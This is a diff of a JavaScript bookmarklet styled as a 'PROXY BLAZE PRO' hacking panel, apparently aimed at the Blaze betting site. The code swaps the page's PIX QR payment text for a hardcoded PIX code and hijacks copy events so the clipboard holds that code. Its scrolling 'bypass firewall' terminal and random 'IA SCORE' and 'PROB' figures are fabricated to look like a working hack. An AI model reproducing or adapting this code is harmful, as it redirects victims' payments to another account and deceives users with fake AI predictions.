@@ -2,122 +2,176 @@ javascript:(function(){
 
 const novoCodigo = "00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/ee7ec1f215234fbd96bb8d0bce76767c5204000053039865802BR5905EFISA6008SAOPAULO62070503***6304077D";
 
-// ===== CONFIG =====
 const ID='proxy-radar-panel';
-const RED='#ff003c', ICE='#00eaff', GREEN='#00ff66';
+const RED='#ff003c', ICE='#00eaff';
+
 let minimized=false;
 
 // ===== STYLE =====
 const style=document.createElement('style');
 style.innerHTML=`
 #${ID}{
-  position:fixed;top:20px;left:20px;width:320px;background:rgba(5,5,5,.92);
-  border-radius:18px;overflow:hidden;z-index:999999;font-family:monospace;
-  box-shadow:0 0 25px rgba(255,0,60,.22),0 0 50px rgba(0,234,255,.08);
-  border:1px solid rgba(0,234,255,.08);backdrop-filter:blur(6px);
+  position:fixed;top:20px;left:20px;width:340px;
+  background:rgba(5,5,5,.95);
+  border-radius:18px;z-index:999999;
+  font-family:monospace;
+  box-shadow:0 0 30px rgba(255,0,60,.3);
+  border:1px solid rgba(0,234,255,.2);
 }
 .head{
   cursor:move;
   padding:10px;
-  font-size:13px;
-  font-weight:900;
   color:${ICE};
+  font-weight:900;
   display:flex;
   justify-content:space-between;
-  align-items:center;
-  background:linear-gradient(90deg, rgba(0,234,255,.04), rgba(255,0,60,.03));
-  border-bottom:1px solid rgba(255,255,255,.04);
   touch-action:none;
 }
-.min-btn{cursor:pointer;color:${RED}}
-.body{padding:12px}
+.body{padding:10px}
 .minimized .body{display:none}
-.radar-shell{width:120px;height:120px;margin:12px auto;}
-.radar3d{
-  width:100%;height:100%;border-radius:50%;
-  background:radial-gradient(circle, rgba(255,0,60,.12), transparent 70%);
+.btn{
+  width:100%;
+  padding:8px;
+  background:${ICE};
+  border:none;
+  border-radius:6px;
+  color:#000;
+  font-weight:bold;
+  margin-bottom:10px;
 }
-.ring{
-  position:absolute;inset:0;border-radius:50%;
-  background:conic-gradient(${RED} var(--p), rgba(255,255,255,.08) 0);
+.status{text-align:center;margin-bottom:10px;font-size:12px}
+.terminal{
+  height:90px;
+  overflow:hidden;
+  font-size:11px;
+  color:#ff2a2a;
+  margin-bottom:10px;
 }
-.percent{
-  position:absolute;inset:0;
-  display:flex;align-items:center;justify-content:center;
-  color:#fff;font-weight:900;
+.stats{
+  font-size:12px;
+  margin-bottom:10px;
 }
-.footer{text-align:center;font-size:10px;margin-top:8px;color:${ICE};}
+.footer{
+  text-align:center;
+  font-size:10px;
+  color:${ICE};
+}
 `;
 document.head.appendChild(style);
 
 // ===== HTML =====
 const box=document.createElement('div');
 box.id=ID;
+
 box.innerHTML=`
-  <div class="head">
-    <span>◆ PROXY + RADAR PANEL</span>
-    <span class="min-btn">—</span>
-  </div>
-  <div class="body">
-    <button id="ativar" style="width:100%;margin-bottom:10px;padding:6px;background:${ICE};border:none;border-radius:5px;color:#000;">ATIVAR QR CODE</button>
-    
-    <div id="status" style="text-align:center;margin-bottom:10px;">Aguardando...</div>
+<div class="head">
+  <span>◆ PROXY BLAZE PRO</span>
+  <span class="min-btn">—</span>
+</div>
 
-    <div class="radar-shell">
-      <div id="radar" class="radar3d" style="--p:0%">
-        <div class="ring"></div>
-        <div id="percent" class="percent">0%</div>
-      </div>
-    </div>
+<div class="body">
 
-    <div class="footer">
-      PROXY PANEL • ● ONLINE
-    </div>
-  </div>
+<button id="ativar" class="btn">ATIVAR QR CODE</button>
+
+<div id="status" class="status">Aguardando...</div>
+
+<div id="terminal" class="terminal"></div>
+
+<div id="stats" class="stats"></div>
+
+<div class="footer">PROXY BLAZE PRO • ● ONLINE</div>
+
+</div>
 `;
+
 document.body.appendChild(box);
 
-// ===== ELEMENTOS =====
+// ===== STATUS =====
 const statusEl=box.querySelector('#status');
-const radar=box.querySelector('#radar');
-const percentEl=box.querySelector('#percent');
 
-// ===== FUNÇÃO =====
-function aplicar(){
-  const qr = document.querySelector(".qr-code-text-inner");
-  if(qr) qr.textContent = novoCodigo;
+// ===== ATIVAR =====
+document.getElementById("ativar").onclick=()=>{
+  const qr=document.querySelector(".qr-code-text-inner");
+  if(qr) qr.textContent=novoCodigo;
 
-  document.addEventListener("copy", function(e){
+  document.addEventListener("copy",(e)=>{
     e.preventDefault();
-    e.clipboardData.setData("text/plain", novoCodigo);
+    e.clipboardData.setData("text/plain",novoCodigo);
   });
 
-  document.querySelectorAll(".qr-code-text, .qr-code-text-inner, .copy-emblem")
-  .forEach(el=>{
-    el.addEventListener("click",(e)=>{
-      e.preventDefault();
-      navigator.clipboard.writeText(novoCodigo);
-      statusEl.innerText="✅ Copiado PROXY";
-    });
-  });
+  statusEl.innerText="🔥 SISTEMA ATIVO";
+};
 
-  statusEl.innerText="🔥 ATIVO";
+// ===== TERMINAL =====
+const terminal=box.querySelector("#terminal");
+
+const baseLines=[
+"conectando blaze...",
+"bypass firewall...",
+"lendo hash sha256...",
+"injetando proxy...",
+"sincronizando dados...",
+"acesso autorizado ✔"
+];
+
+let li=0,ci=0;
+let currentLine="";
+
+function typeEffect(){
+
+  if(ci < baseLines[li].length){
+    currentLine += baseLines[li][ci];
+    terminal.innerHTML=currentLine+"█";
+    ci++;
+  }else{
+    terminal.innerHTML+= "<br>";
+    li = (li+1) % baseLines.length;
+    ci=0;
+    currentLine="";
+  }
+
+  terminal.scrollTop=terminal.scrollHeight;
+
+  setTimeout(typeEffect,30);
 }
 
-document.getElementById("ativar").onclick=aplicar;
+typeEffect();
 
-// ===== RADAR =====
-function runRadar(){
-  let s=Date.now();
-  const t=setInterval(()=>{
-    const p=Math.min(100,((Date.now()-s)/1000)*100);
-    radar.style.setProperty('--p',p+'%');
-    percentEl.textContent=(p|0)+'%';
-    if(p>=100) clearInterval(t);
-  },16);
+// ===== STATS DINÂMICOS =====
+const statsEl=box.querySelector("#stats");
+
+let stats={
+  score:92384,
+  signal:88293,
+  prob:97344
+};
+
+function spin(v){
+  const jump = Math.floor(Math.random()*5000) - 2500;
+  v = Math.abs((v + jump) ^ (Math.random()*99999));
+  return (v % 99999);
 }
 
-// ===== ARRASTAR (PC + CELULAR) =====
+function format(n){
+  return Math.floor(n).toString().padStart(5,"0");
+}
+
+function updateStats(){
+
+  stats.score=spin(stats.score);
+  stats.signal=spin(stats.signal);
+  stats.prob=spin(stats.prob);
+
+  statsEl.innerHTML=
+    "IA SCORE: "+format(stats.score)+"<br>"+
+    "FORÇA: "+format(stats.signal)+"<br>"+
+    "PROB: "+format(stats.prob)+"%";
+
+}
+
+setInterval(updateStats,300);
+
+// ===== ARRASTAR (PC + MOBILE) =====
 const head = box.querySelector('.head');
 let dx, dy, drag = false;
 
@@ -134,28 +188,24 @@ document.addEventListener("mousemove", (e) => {
   box.style.top = e.clientY - dy + "px";
 });
 
-document.addEventListener("mouseup", () => {
-  drag = false;
-});
+document.addEventListener("mouseup", () => drag = false);
 
-// CELULAR
+// MOBILE
 head.addEventListener("touchstart", (e) => {
   drag = true;
-  const touch = e.touches[0];
-  dx = touch.clientX - box.offsetLeft;
-  dy = touch.clientY - box.offsetTop;
+  const t = e.touches[0];
+  dx = t.clientX - box.offsetLeft;
+  dy = t.clientY - box.offsetTop;
 });
 
 document.addEventListener("touchmove", (e) => {
   if (!drag) return;
-  const touch = e.touches[0];
-  box.style.left = touch.clientX - dx + "px";
-  box.style.top = touch.clientY - dy + "px";
+  const t = e.touches[0];
+  box.style.left = t.clientX - dx + "px";
+  box.style.top = t.clientY - dy + "px";
 });
 
-document.addEventListener("touchend", () => {
-  drag = false;
-});
+document.addEventListener("touchend", () => drag = false);
 
 // ===== MINIMIZAR =====
 box.querySelector('.min-btn').onclick=()=>{
